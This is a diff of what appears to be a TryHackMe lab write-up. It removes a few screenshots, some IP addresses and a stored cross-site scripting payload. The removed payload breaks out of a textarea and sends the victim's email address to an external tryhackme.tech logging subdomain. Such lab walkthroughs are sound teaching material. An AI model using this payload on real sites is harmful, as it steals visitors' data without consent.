@@ -275,25 +275,11 @@ adminaccount@itsupport.thm and 3.251.105.234
 
 ![image](https://github.com/user-attachments/assets/1d10e502-7aef-47a2-84fe-d53171bebc2c)
 
-<br>
 
-![image](https://github.com/user-attachments/assets/b7385fc7-72d4-4438-aa97-9bea999e5fb9)
-
-<br>3.248.180.240 and 99.80.88.107, 34.245.205.141, 99.80.88.112, 3.248.180.146
 
 <br>
 
-```bash
-
-</textarea><script>
-var email = document.getElementById("email").innerText;
-email = email.replace("@", "0")
-email = email.replace(".", "x")
-document.location = "http://" + email + ".7ef262a90eea7ea25af17345f13927ab.log.tryhackme.tech";
-
-```
-
-
+![image](https://github.com/user-attachments/assets/8f329523-bcc1-4ccd-a9f6-5d3020096927)
 
 
 
